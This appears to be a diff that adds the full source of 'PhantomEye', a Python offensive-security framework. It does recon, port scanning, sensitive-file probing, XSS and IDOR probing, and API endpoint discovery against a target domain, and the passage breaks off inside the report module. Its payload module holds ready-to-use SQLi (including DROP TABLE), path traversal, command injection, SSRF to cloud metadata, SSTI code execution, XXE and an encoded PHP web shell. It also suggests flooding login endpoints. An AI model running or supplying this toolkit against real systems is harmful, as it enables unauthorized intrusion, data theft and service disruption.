@@ -1,0 +1,963 @@
+Struktur Folder
+textPhantomEye/
+├── phantomeye.py
+├── requirements.txt
+├── README.md
+├── modules/
+│   ├── __init__.py
+│   ├── recon.py
+│   ├── vuln.py
+│   ├── owasp.py
+│   ├── api_top10.py
+│   ├── payloads.py
+│   └── report.py
+└── utils/
+    ├── __init__.py
+    ├── banner.py
+    ├── helpers.py
+    └── config.py
+
+1. requirements.txt
+txtrequests>=2.31.0
+urllib3>=2.0.0
+
+2. README.md
+Markdown# PHANTOM EYE
+**Offensive Security Automation Framework**
+SYSTEM_OFFSEC • v1.0
+text## Features
+
+- Full Reconnaissance (WHOIS, DNS, Subdomains, Port Scan, Tech Detect)
+- Vulnerability Assessment (Sensitive files, Security Headers)
+- OWASP Top 10 Testing + Payloads
+- API Security Top 10 Testing
+- Payload Generation (XSS, SQLi, LFI, RCE, SSRF, SSTI, XXE, etc.)
+- Beautiful TXT Report
+- Optional Telegram dump
+
+## Installation
+
+```bash
+cd PhantomEye
+pip install -r requirements.txt
+chmod +x phantomeye.py
+Usage
+Bash# Full scan
+python3 phantomeye.py BigSam.com
+
+# Specific mode
+python3 phantomeye.py BigSam.com -m recon
+python3 phantomeye.py BigSam.com -m owasp
+python3 phantomeye.py BigSam.com -m api
+python3 phantomeye.py BigSam.com -m payload
+
+# Custom output
+python3 phantomeye.py BigSam.com -o myreport.txt
+
+# Send report to Telegram
+python3 phantomeye.py BigSam.com --telegram BOT_TOKEN --chat-id CHAT_ID
+
+# Quiet + no color
+python3 phantomeye.py BigSam.com -q --no-color
+Structure
+textPhantomEye/
+├── phantomeye.py
+├── requirements.txt
+├── modules/
+│   ├── recon.py
+│   ├── vuln.py
+│   ├── owasp.py
+│   ├── api_top10.py
+│   ├── payloads.py
+│   └── report.py
+├── utils/
+│   ├── banner.py
+│   ├── helpers.py
+│   └── config.py
+└── reports/
+text---
+
+### 3. phantomeye.py (Main)
+
+```python
+#!/usr/bin/env python3
+"""
+PHANTOM EYE - Offensive Security Automation Framework
+Full Terminal Version
+Author: SYSTEM_OFFSEC
+"""
+
+import argparse
+import sys
+import os
+from datetime import datetime
+
+from modules.recon import run_recon
+from modules.vuln import run_vuln_assessment
+from modules.owasp import run_owasp_top10
+from modules.api_top10 import run_api_top10
+from modules.payloads import generate_payloads
+from modules.report import generate_report
+from utils.banner import print_banner
+from utils.helpers import color, save_to_telegram
+from utils.config import Config
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="PHANTOM EYE - Offensive Security Automation Framework",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+    parser.add_argument("target", help="Target domain or URL (e.g. BigSam.com)")
+    parser.add_argument("-m", "--mode", choices=["full", "recon", "vuln", "owasp", "api", "payload"],
+                        default="full", help="Scan mode (default: full)")
+    parser.add_argument("-o", "--output", help="Custom output report filename")
+    parser.add_argument("--telegram", help="Telegram Bot Token (optional)")
+    parser.add_argument("--chat-id", help="Telegram Chat ID (optional)")
+    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
+    parser.add_argument("--no-color", action="store_true", help="Disable colored output")
+    parser.add_argument("-q", "--quiet", action="store_true", help="Minimal output")
+    return parser.parse_args()
+
+
+def main():
+    args = parse_args()
+    Config.NO_COLOR = args.no_color
+    Config.QUIET = args.quiet
+    Config.THREADS = args.threads
+
+    if not args.quiet:
+        print_banner()
+
+    target = args.target.strip().lower().replace("https://", "").replace("http://", "").split("/")[0]
+    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+    report_dir = "reports"
+    os.makedirs(report_dir, exist_ok=True)
+
+    report_file = args.output if args.output else f"{report_dir}/{target}_{timestamp}.txt"
+
+    print(color(f"\n[+] Target        : {target}", "cyan"))
+    print(color(f"[+] Mode          : {args.mode.upper()}", "cyan"))
+    print(color(f"[+] Started       : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "cyan"))
+    print(color(f"[+] Report        : {report_file}\n", "cyan"))
+    print("-" * 60)
+
+    results = {
+        "target": target,
+        "start_time": datetime.now().isoformat(),
+        "recon": {},
+        "vuln": {},
+        "owasp": {},
+        "api": {},
+        "payloads": {},
+        "errors": []
+    }
+
+    try:
+        if args.mode in ["full", "recon"]:
+            print(color("\n[*] Phase 1/5 : Reconnaissance", "yellow"))
+            results["recon"] = run_recon(target)
+
+        if args.mode in ["full", "vuln"]:
+            print(color("\n[*] Phase 2/5 : Vulnerability Assessment", "yellow"))
+            results["vuln"] = run_vuln_assessment(target)
+
+        if args.mode in ["full", "owasp"]:
+            print(color("\n[*] Phase 3/5 : OWASP Top 10 Testing", "yellow"))
+            results["owasp"] = run_owasp_top10(target)
+
+        if args.mode in ["full", "api"]:
+            print(color("\n[*] Phase 4/5 : API Security Top 10", "yellow"))
+            results["api"] = run_api_top10(target)
+
+        if args.mode in ["full", "payload"]:
+            print(color("\n[*] Phase 5/5 : Payload Generation", "yellow"))
+            results["payloads"] = generate_payloads(target, results)
+
+        results["end_time"] = datetime.now().isoformat()
+
+        print(color("\n[*] Generating Report...", "yellow"))
+        report_content = generate_report(results, report_file)
+
+        print(color(f"\n[✓] Scan completed successfully", "green"))
+        print(color(f"[✓] Report saved → {report_file}", "green"))
+
+        if args.telegram and args.chat_id:
+            print(color("\n[*] Sending report to Telegram...", "yellow"))
+            success = save_to_telegram(report_content, args.telegram, args.chat_id)
+            if success:
+                print(color("[✓] Report sent to Telegram", "green"))
+            else:
+                print(color("[!] Failed to send to Telegram", "red"))
+
+    except KeyboardInterrupt:
+        print(color("\n\n[!] Scan interrupted by user", "red"))
+        sys.exit(1)
+    except Exception as e:
+        print(color(f"\n[!] Critical error: {str(e)}", "red"))
+        results["errors"].append(str(e))
+        generate_report(results, report_file)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+
+4. utils/config.py
+Python"""Global configuration"""
+
+class Config:
+    NO_COLOR = False
+    QUIET = False
+    THREADS = 10
+    USER_AGENT = "Mozilla/5.0 (PhantomEye/1.0; Offensive Security Scanner)"
+    TIMEOUT = 10
+
+5. utils/helpers.py
+Python"""Helper functions"""
+
+import requests
+from utils.config import Config
+
+COLORS = {
+    "red": "\033[91m",
+    "green": "\033[92m",
+    "yellow": "\033[93m",
+    "blue": "\033[94m",
+    "cyan": "\033[96m",
+    "magenta": "\033[95m",
+    "white": "\033[97m",
+    "reset": "\033[0m",
+    "bold": "\033[1m",
+}
+
+def color(text, color_name="white"):
+    if Config.NO_COLOR:
+        return text
+    return f"{COLORS.get(color_name, '')}{text}{COLORS['reset']}"
+
+
+def save_to_telegram(content: str, bot_token: str, chat_id: str) -> bool:
+    try:
+        max_len = 4000
+        chunks = [content[i:i+max_len] for i in range(0, len(content), max_len)]
+
+        for i, chunk in enumerate(chunks):
+            url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+            payload = {
+                "chat_id": chat_id,
+                "text": f"```\n{chunk}\n```" if i == 0 else chunk,
+                "parse_mode": "Markdown"
+            }
+            resp = requests.post(url, json=payload, timeout=15)
+            if resp.status_code != 200:
+                return False
+        return True
+    except Exception:
+        return False
+
+
+def print_status(msg, status="info"):
+    symbols = {
+        "info": ("[*]", "cyan"),
+        "success": ("[✓]", "green"),
+        "warning": ("[!]", "yellow"),
+        "error": ("[✗]", "red"),
+        "phase": ("[»]", "magenta"),
+    }
+    sym, col = symbols.get(status, ("[*]", "white"))
+    print(color(f"{sym} {msg}", col))
+
+6. utils/banner.py
+Python"""Banner and visual elements"""
+
+from utils.helpers import color
+
+def print_banner():
+    banner = r"""
+╔══════════════════════════════════════════════════════════════════════╗
+║                                                                      ║
+║   ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗    ║
+║   ██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║    ║
+║   ██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║    ║
+║   ██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║    ║
+║   ██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║    ║
+║   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝    ║
+║                                                                      ║
+║          E Y E   //   Offensive Security Automation Framework        ║
+║                     SYSTEM_OFFSEC  •  v1.0                           ║
+╚══════════════════════════════════════════════════════════════════════╝
+"""
+    print(color(banner, "cyan"))
+
+7. utils/init.py
+Python# Phantom Eye Utils
+
+8. modules/init.py
+Python# Phantom Eye Modules
+
+9. modules/recon.py
+Python"""Reconnaissance Module"""
+
+import socket
+import subprocess
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from utils.helpers import color, print_status
+from utils.config import Config
+
+COMMON_SUBDOMAINS = [
+    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk",
+    "ns2", "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test",
+    "ns", "blog", "pop3", "dev", "www2", "admin", "forum", "news", "vpn", "ns3",
+    "mail2", "new", "mysql", "old", "lists", "support", "mobile", "mx", "static",
+    "docs", "beta", "shop", "sql", "secure", "demo", "cp", "calendar", "wiki",
+    "web", "media", "email", "images", "img", "www1", "intranet", "portal", "video",
+    "sip", "dns2", "api", "cdn", "stats", "dns1", "ns4", "www3", "dns", "search",
+    "staging", "server", "mx1", "chat", "wap", "my", "svn", "mail1", "sites",
+    "proxy", "ads", "online", "app", "stage"
+]
+
+def run_recon(target: str) -> dict:
+    results = {
+        "whois": {},
+        "dns": {},
+        "subdomains": [],
+        "ports": [],
+        "technologies": [],
+        "headers": {},
+        "ip": None
+    }
+
+    try:
+        ip = socket.gethostbyname(target)
+        results["ip"] = ip
+        print_status(f"IP Address     : {ip}", "success")
+    except Exception as e:
+        print_status(f"IP resolve failed: {e}", "error")
+        results["ip"] = "N/A"
+
+    print_status("Running WHOIS...", "info")
+    try:
+        whois_data = subprocess.check_output(
+            ["whois", target], stderr=subprocess.STDOUT, timeout=15
+        ).decode(errors="ignore")
+        results["whois"]["raw"] = whois_data[:2000]
+        print_status("WHOIS data retrieved", "success")
+    except Exception:
+        results["whois"]["raw"] = "WHOIS not available or failed"
+        print_status("WHOIS failed (tool missing or blocked)", "warning")
+
+    print_status("Enumerating DNS records...", "info")
+    dns_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]
+    for rtype in dns_types:
+        try:
+            out = subprocess.check_output(
+                ["dig", "+short", target, rtype],
+                stderr=subprocess.STDOUT, timeout=8
+            ).decode().strip()
+            if out:
+                results["dns"][rtype] = out.splitlines()
+        except Exception:
+            results["dns"][rtype] = []
+    print_status(f"DNS records collected: {list(results['dns'].keys())}", "success")
+
+    print_status("Discovering subdomains...", "info")
+    found = set()
+
+    def check_sub(sub):
+        full = f"{sub}.{target}"
+        try:
+            socket.gethostbyname(full)
+            return full
+        except Exception:
+            return None
+
+    with ThreadPoolExecutor(max_workers=Config.THREADS) as executor:
+        futures = {executor.submit(check_sub, s): s for s in COMMON_SUBDOMAINS}
+        for future in as_completed(futures):
+            res = future.result()
+            if res:
+                found.add(res)
+
+    results["subdomains"] = sorted(list(found))
+    print_status(f"Subdomains found: {len(results['subdomains'])}", "success")
+    for s in results["subdomains"][:10]:
+        print(color(f"    • {s}", "white"))
+    if len(results["subdomains"]) > 10:
+        print(color(f"    ... and {len(results['subdomains'])-10} more", "white"))
+
+    print_status("Scanning common ports...", "info")
+    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 3306, 3389, 8080, 8443]
+    open_ports = []
+
+    def scan_port(port):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(1.5)
+            result = sock.connect_ex((results["ip"] if results["ip"] != "N/A" else target, port))
+            sock.close()
+            if result == 0:
+                return port
+        except Exception:
+            return None
+        return None
+
+    if results["ip"] != "N/A":
+        with ThreadPoolExecutor(max_workers=20) as executor:
+            futures = {executor.submit(scan_port, p): p for p in common_ports}
+            for future in as_completed(futures):
+                res = future.result()
+                if res:
+                    open_ports.append(res)
+
+    results["ports"] = sorted(open_ports)
+    print_status(f"Open ports: {results['ports']}", "success")
+
+    print_status("Fetching HTTP headers & tech...", "info")
+    for scheme in ["https", "http"]:
+        try:
+            url = f"{scheme}://{target}"
+            resp = requests.get(url, timeout=Config.TIMEOUT, headers={"User-Agent": Config.USER_AGENT}, verify=False, allow_redirects=True)
+            results["headers"] = dict(resp.headers)
+            server = resp.headers.get("Server", "Unknown")
+            powered = resp.headers.get("X-Powered-By", "")
+            results["technologies"].append(f"Server: {server}")
+            if powered:
+                results["technologies"].append(f"X-Powered-By: {powered}")
+            if "cloudflare" in str(resp.headers).lower():
+                results["technologies"].append("Cloudflare")
+            print_status(f"HTTP {resp.status_code} - Server: {server}", "success")
+            break
+        except Exception:
+            continue
+
+    return results
+
+10. modules/vuln.py
+Python"""Vulnerability Assessment Module"""
+
+import requests
+from urllib.parse import urljoin
+from utils.helpers import print_status
+from utils.config import Config
+
+requests.packages.urllib3.disable_warnings()
+
+SENSITIVE_PATHS = [
+    "/.git/HEAD", "/.git/config", "/.env", "/.svn/entries",
+    "/backup.zip", "/backup.tar.gz", "/site.zip", "/db.sql",
+    "/phpinfo.php", "/info.php", "/test.php", "/admin", "/admin/",
+    "/administrator", "/login", "/wp-admin", "/wp-login.php",
+    "/config.php", "/config.js", "/config.json", "/robots.txt",
+    "/sitemap.xml", "/.DS_Store", "/server-status", "/server-info",
+    "/api", "/api/v1", "/swagger", "/swagger-ui", "/graphql",
+    "/debug", "/console", "/.well-known/security.txt"
+]
+
+SECURITY_HEADERS = [
+    "Content-Security-Policy",
+    "X-Frame-Options",
+    "X-Content-Type-Options",
+    "Strict-Transport-Security",
+    "Referrer-Policy",
+    "Permissions-Policy",
+    "X-XSS-Protection"
+]
+
+def run_vuln_assessment(target: str) -> dict:
+    results = {
+        "sensitive_files": [],
+        "missing_headers": [],
+        "interesting_findings": [],
+        "status_codes": {}
+    }
+
+    base_urls = [f"https://{target}", f"http://{target}"]
+
+    print_status("Checking sensitive paths...", "info")
+    for base in base_urls:
+        for path in SENSITIVE_PATHS:
+            url = urljoin(base, path)
+            try:
+                resp = requests.get(
+                    url, timeout=6,
+                    headers={"User-Agent": Config.USER_AGENT},
+                    verify=False, allow_redirects=False
+                )
+                code = resp.status_code
+                results["status_codes"][path] = code
+
+                if code in [200, 301, 302, 403]:
+                    if code == 200 and len(resp.content) > 0:
+                        results["sensitive_files"].append({
+                            "url": url,
+                            "status": code,
+                            "length": len(resp.content)
+                        })
+                        print_status(f"Found: {url} [{code}]", "warning")
+                    elif code in [301, 302, 403]:
+                        results["interesting_findings"].append(f"{url} → {code}")
+            except Exception:
+                continue
+        break
+
+    print_status(f"Sensitive/Interesting paths found: {len(results['sensitive_files']) + len(results['interesting_findings'])}", "success")
+
+    print_status("Analyzing security headers...", "info")
+    for base in base_urls:
+        try:
+            resp = requests.get(base, timeout=8, headers={"User-Agent": Config.USER_AGENT}, verify=False)
+            headers = {k.lower(): v for k, v in resp.headers.items()}
+            for h in SECURITY_HEADERS:
+                if h.lower() not in headers:
+                    results["missing_headers"].append(h)
+            print_status(f"Missing security headers: {len(results['missing_headers'])}", "success")
+            break
+        except Exception:
+            continue
+
+    return results
+
+11. modules/owasp.py
+Python"""OWASP Top 10 Testing Module"""
+
+import requests
+from urllib.parse import urljoin, quote
+from utils.helpers import print_status
+from utils.config import Config
+
+requests.packages.urllib3.disable_warnings()
+
+XSS_PAYLOADS = [
+    "<script>alert('PhantomEye')</script>",
+    "\"><script>alert(1)</script>",
+    "'\"><img src=x onerror=alert(1)>",
+    "<svg/onload=alert(1)>",
+    "javascript:alert(1)",
+    "<body onload=alert(1)>",
+    "'-alert(1)-'",
+    "<iframe src=\"javascript:alert(1)\">",
+]
+
+SQLI_PAYLOADS = [
+    "' OR '1'='1",
+    "' OR 1=1--",
+    "\" OR \"1\"=\"1",
+    "' OR '1'='1' /*",
+    "1' ORDER BY 1--+",
+    "1' ORDER BY 2--+",
+    "1' ORDER BY 3--+",
+    "' UNION SELECT NULL--",
+    "' UNION SELECT NULL,NULL--",
+    "admin'--",
+    "1; DROP TABLE users--",
+]
+
+LFI_PAYLOADS = [
+    "../../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "/etc/passwd",
+    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+    "....\/....\/....\/etc/passwd",
+    "/proc/self/environ",
+    "php://filter/convert.base64-encode/resource=index.php",
+]
+
+RCE_PAYLOADS = [
+    "; id",
+    "| id",
+    "`id`",
+    "$(id)",
+    "&& id",
+    "|| id",
+    "; cat /etc/passwd",
+    "| cat /etc/passwd",
+]
+
+SSRF_PAYLOADS = [
+    "http://127.0.0.1",
+    "http://localhost",
+    "http://169.254.169.254/latest/meta-data/",
+    "http://[::1]",
+    "file:///etc/passwd",
+]
+
+OPEN_REDIRECT_PAYLOADS = [
+    "//evil.com",
+    "https://evil.com",
+    "/\\evil.com",
+    "////evil.com",
+    "https:evil.com",
+]
+
+
+def run_owasp_top10(target: str) -> dict:
+    results = {
+        "A01_Broken_Access_Control": {"status": "checked", "findings": []},
+        "A02_Cryptographic_Failures": {"status": "checked", "findings": []},
+        "A03_Injection": {"status": "checked", "findings": [], "payloads_tested": []},
+        "A04_Insecure_Design": {"status": "info", "findings": ["Manual review required"]},
+        "A05_Security_Misconfiguration": {"status": "checked", "findings": []},
+        "A06_Vulnerable_Components": {"status": "info", "findings": ["Requires dependency check"]},
+        "A07_Auth_Failures": {"status": "checked", "findings": []},
+        "A08_Software_Data_Integrity": {"status": "info", "findings": []},
+        "A09_Logging_Monitoring": {"status": "info", "findings": ["Manual review required"]},
+        "A10_SSRF": {"status": "checked", "findings": [], "payloads_tested": []},
+        "tested_payloads": {
+            "xss": XSS_PAYLOADS,
+            "sqli": SQLI_PAYLOADS,
+            "lfi": LFI_PAYLOADS,
+            "rce": RCE_PAYLOADS,
+            "ssrf": SSRF_PAYLOADS,
+            "open_redirect": OPEN_REDIRECT_PAYLOADS
+        }
+    }
+
+    base = f"https://{target}"
+    print_status("Running OWASP Top 10 checks...", "info")
+
+    print_status("A03 - Injection (XSS / SQLi probes)...", "info")
+    test_params = ["q", "search", "id", "page", "query", "s", "keyword"]
+
+    for param in test_params:
+        for payload in XSS_PAYLOADS[:3]:
+            try:
+                url = f"{base}/?{param}={quote(payload)}"
+                resp = requests.get(url, timeout=6, headers={"User-Agent": Config.USER_AGENT}, verify=False)
+                if payload in resp.text or "alert" in resp.text.lower():
+                    results["A03_Injection"]["findings"].append(f"Possible XSS reflection on ?{param}=")
+                    print_status(f"Possible XSS on parameter: {param}", "warning")
+                    break
+            except Exception:
+                continue
+
+    results["A03_Injection"]["payloads_tested"] = XSS_PAYLOADS + SQLI_PAYLOADS
+
+    print_status("A05 - Security Misconfiguration...", "info")
+    try:
+        resp = requests.get(base, timeout=8, headers={"User-Agent": Config.USER_AGENT}, verify=False)
+        headers = {k.lower(): v for k, v in resp.headers.items()}
+        if "server" in headers:
+            results["A05_Security_Misconfiguration"]["findings"].append(f"Server header exposed: {headers['server']}")
+        if "x-powered-by" in headers:
+            results["A05_Security_Misconfiguration"]["findings"].append(f"X-Powered-By exposed: {headers['x-powered-by']}")
+    except Exception:
+        pass
+
+    print_status("A07 - Auth related paths...", "info")
+    auth_paths = ["/login", "/admin", "/administrator", "/wp-login.php", "/user/login", "/signin"]
+    for path in auth_paths:
+        try:
+            url = urljoin(base, path)
+            resp = requests.get(url, timeout=5, headers={"User-Agent": Config.USER_AGENT}, verify=False, allow_redirects=False)
+            if resp.status_code in [200, 301, 302, 401, 403]:
+                results["A07_Auth_Failures"]["findings"].append(f"{url} → {resp.status_code}")
+        except Exception:
+            continue
+
+    print_status("A10 - SSRF payload list prepared...", "info")
+    results["A10_SSRF"]["payloads_tested"] = SSRF_PAYLOADS
+    results["A10_SSRF"]["findings"].append("SSRF payloads ready for manual/API testing")
+
+    print_status("OWASP Top 10 phase completed", "success")
+    return results
+
+12. modules/api_top10.py
+Python"""API Security Top 10 Testing Module"""
+
+import requests
+from urllib.parse import urljoin
+from utils.helpers import print_status
+from utils.config import Config
+
+requests.packages.urllib3.disable_warnings()
+
+API_PATHS = [
+    "/api", "/api/v1", "/api/v2", "/api/v3",
+    "/graphql", "/graphiql", "/api/graphql",
+    "/swagger", "/swagger-ui", "/swagger.json", "/swagger/v1/swagger.json",
+    "/openapi.json", "/api-docs", "/docs", "/redoc",
+    "/api/users", "/api/user", "/api/login", "/api/auth",
+    "/api/admin", "/api/config", "/api/health", "/api/status",
+    "/v1/users", "/v1/auth", "/rest", "/rest/api",
+    "/api/internal", "/api/private", "/api/debug"
+]
+
+BOLA_PAYLOADS = [
+    "/api/users/1", "/api/users/2", "/api/user/1",
+    "/api/orders/1", "/api/accounts/1", "/api/profiles/1"
+]
+
+
+def run_api_top10(target: str) -> dict:
+    results = {
+        "discovered_endpoints": [],
+        "api1_bola": {"status": "checked", "findings": []},
+        "api2_auth": {"status": "checked", "findings": []},
+        "api5_function_level": {"status": "checked", "findings": []},
+        "api7_ssrf": {"status": "info", "findings": ["SSRF payloads available in OWASP module"]},
+        "api8_misconfig": {"status": "checked", "findings": []},
+        "api9_inventory": {"status": "checked", "findings": []},
+        "interesting": []
+    }
+
+    base = f"https://{target}"
+    print_status("Discovering API endpoints...", "info")
+
+    for path in API_PATHS:
+        url = urljoin(base, path)
+        try:
+            resp = requests.get(
+                url, timeout=6,
+                headers={"User-Agent": Config.USER_AGENT, "Accept": "application/json"},
+                verify=False, allow_redirects=False
+            )
+            if resp.status_code in [200, 201, 301, 302, 401, 403, 405]:
+                entry = {
+                    "url": url,
+                    "status": resp.status_code,
+                    "content_type": resp.headers.get("Content-Type", ""),
+                    "length": len(resp.content)
+                }
+                results["discovered_endpoints"].append(entry)
+                results["api9_inventory"]["findings"].append(f"{url} [{resp.status_code}]")
+
+                if resp.status_code == 200 and "json" in resp.headers.get("Content-Type", "").lower():
+                    print_status(f"API endpoint live: {url}", "warning")
+                elif resp.status_code in [401, 403]:
+                    results["api2_auth"]["findings"].append(f"{url} requires auth [{resp.status_code}]")
+        except Exception:
+            continue
+
+    print_status(f"API endpoints discovered: {len(results['discovered_endpoints'])}", "success")
+
+    print_status("Checking potential BOLA / IDOR paths...", "info")
+    for path in BOLA_PAYLOADS:
+        url = urljoin(base, path)
+        try:
+            resp = requests.get(url, timeout=5, headers={"User-Agent": Config.USER_AGENT}, verify=False)
+            if resp.status_code == 200:
+                results["api1_bola"]["findings"].append(f"Possible BOLA: {url} → 200")
+                print_status(f"Possible BOLA/IDOR: {url}", "warning")
+        except Exception:
+            continue
+
+    admin_paths = ["/api/admin", "/api/admin/users", "/admin/api", "/api/internal"]
+    for path in admin_paths:
+        url = urljoin(base, path)
+        try:
+            resp = requests.get(url, timeout=5, headers={"User-Agent": Config.USER_AGENT}, verify=False)
+            if resp.status_code in [200, 401, 403]:
+                results["api5_function_level"]["findings"].append(f"{url} → {resp.status_code}")
+        except Exception:
+            continue
+
+    print_status("API Top 10 phase completed", "success")
+    return results
+
+13. modules/payloads.py
+Python"""Payload Generation Module"""
+
+from utils.helpers import print_status
+
+def generate_payloads(target: str, previous_results: dict) -> dict:
+    print_status("Generating full payload sets...", "info")
+
+    payloads = {
+        "xss": [
+            "<script>alert('PhantomEye')</script>",
+            "\"><script>alert(1)</script>",
+            "'\"><img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>",
+            "javascript:alert(1)",
+            "<body onload=alert(1)>",
+            "'-alert(1)-'",
+            "<iframe src=\"javascript:alert(1)\">",
+            "<img src=x onerror=prompt(1)>",
+            "<details open ontoggle=alert(1)>",
+        ],
+        "sqli": [
+            "' OR '1'='1",
+            "' OR 1=1--",
+            "\" OR \"1\"=\"1",
+            "' OR '1'='1' /*",
+            "1' ORDER BY 1--+",
+            "1' ORDER BY 2--+",
+            "1' ORDER BY 3--+",
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--",
+            "admin'--",
+            "1; DROP TABLE users--",
+            "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
+        ],
+        "lfi": [
+            "../../../../etc/passwd",
+            "....//....//....//etc/passwd",
+            "/etc/passwd",
+            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+            "....\/....\/....\/etc/passwd",
+            "/proc/self/environ",
+            "php://filter/convert.base64-encode/resource=index.php",
+            "php://input",
+            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
+        ],
+        "rce": [
+            "; id",
+            "| id",
+            "`id`",
+            "$(id)",
+            "&& id",
+            "|| id",
+            "; cat /etc/passwd",
+            "| cat /etc/passwd",
+            "; uname -a",
+            "$(whoami)",
+        ],
+        "ssrf": [
+            "http://127.0.0.1",
+            "http://localhost",
+            "http://169.254.169.254/latest/meta-data/",
+            "http://[::1]",
+            "file:///etc/passwd",
+            "http://0.0.0.0",
+            "http://127.0.0.1:22",
+            "http://127.0.0.1:3306",
+        ],
+        "open_redirect": [
+            "//evil.com",
+            "https://evil.com",
+            "/\\evil.com",
+            "////evil.com",
+            "https:evil.com",
+            "//google.com%2f%2e%2e",
+        ],
+        "ssti": [
+            "{{7*7}}",
+            "${7*7}",
+            "<%= 7*7 %>",
+            "{{config}}",
+            "{{self}}",
+            "${T(java.lang.Runtime).getRuntime().exec('id')}",
+        ],
+        "xxe": [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
+        ],
+        "crlf": [
+            "%0d%0aSet-Cookie:%20phantom=eye",
+            "%0aSet-Cookie:%20phantom=eye",
+            "%0d%0aX-Injected:%20true",
+        ],
+        "api_abuse": [
+            "Send 1000+ requests/sec to /api/login",
+            "Bulk create objects via /api/users",
+            "Recursive nested payloads in GraphQL",
+        ]
+    }
+
+    print_status(f"Payload categories generated: {len(payloads)}", "success")
+    for category, items in payloads.items():
+        print_status(f"  • {category.upper():<15} : {len(items)} payloads", "info")
+
+    return payloads
+
+14. modules/report.py
+Python"""Report Generation Module"""
+
+from datetime import datetime
+from utils.helpers import print_status
+
+def generate_report(results: dict, output_file: str) -> str:
+    lines = []
+    lines.append("=" * 70)
+    lines.append("          P H A N T O M   E Y E   R E P O R T")
+    lines.append("          Offensive Security Automation Framework")
+    lines.append("=" * 70)
+    lines.append(f"Target      : {results.get('target', 'N/A')}")
+    lines.append(f"Start Time  : {results.get('start_time', 'N/A')}")
+    lines.append(f"End Time    : {results.get('end_time', 'N/A')}")
+    lines.append(f"Generated   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    lines.append("=" * 70)
+
+    recon = results.get("recon", {})
+    lines.append("\n\n[1] RECONNAISSANCE")
+    lines.append("-" * 50)
+    lines.append(f"IP Address     : {recon.get('ip', 'N/A')}")
+    lines.append(f"Open Ports     : {recon.get('ports', [])}")
+    lines.append(f"Subdomains     : {len(recon.get('subdomains', []))} found")
+    for sub in recon.get("subdomains", [])[:20]:
+        lines.append(f"    • {sub}")
+    if len(recon.get("subdomains", [])) > 20:
+        lines.append(f"    ... and {len(recon.get('subdomains', []))-20} more")
+    lines.append(f"\nTechnologies   : {recon.get('technologies', [])}")
+    lines.append(f"\nDNS Records:")
+    for rtype, records in recon.get("dns", {}).items():
+        if records:
+            lines.append(f"  {rtype}: {records}")
+
+    vuln = results.get("vuln", {})
+    lines.append("\n\n[2] VULNERABILITY ASSESSMENT")
+    lines.append("-" * 50)
+    lines.append(f"Sensitive Files Found : {len(vuln.get('sensitive_files', []))}")
+    for item in vuln.get("sensitive_files", []):
+        lines.append(f"  • {item.get('url')} [{item.get('status')}] (len={item.get('length')})")
+    lines.append(f"\nMissing Security Headers: {vuln.get('missing_headers', [])}")
+    lines.append(f"Interesting Findings  : {len(vuln.get('interesting_findings', []))}")
+    for f in vuln.get("interesting_findings", [])[:10]:
+        lines.append(f"  • {f}")
+
+    owasp = results.get("owasp", {})
+    lines.append("\n\n[3] OWASP TOP 10")
+    lines.append("-" * 50)
+    for key, data in owasp.items():
+        if key == "tested_payloads":
+            continue
+        if isinstance(data, dict):
+            findings = data.get("findings", [])
+            lines.append(f"\n{key}:")
+            lines.append(f"  Status   : {data.get('status', 'N/A')}")
+            if findings:
+                for f in findings:
+                    lines.append(f"  - {f}")
+            else:
+                lines.append("  - No major findings in automated check")
+
+    api = results.get("api", {})
+    lines.append("\n\n[4] API SECURITY TOP 10")
+    lines.append("-" * 50)
+    lines.append(f"Discovered Endpoints: {len(api.get('discovered_endpoints', []))}")
+    for ep in api.get("discovered_endpoints", []):
+        lines.append(f"  • {ep.get('url')} [{ep.get('status')}] {ep.get('content_type', '')}")
+
+    lines.append("\nAPI1 - BOLA/IDOR:")
+    for f in api.get("api1_bola", {}).get("findings", []):
+        lines.append(f"  - {f}")
+
+    lines.append("\nAPI2 - Authentication:")
+    for f in api.get("api2_auth", {}).get("findings", []):
+        lines.append(f"  - {f}")
+
+    lines.append("\nAPI5 - Function Level Authorization:")
+    for f in api.get("api5_function_level", {}).get("findings", []):
+        lines.append(f"  - {f}")
+
+    payloads = results.get("payloads", {})
+    lines.append("\n\n[5] PAYLOADS READY FOR TESTING")
+    lines.append("-" * 50)
+    for category, items in payloads.items():
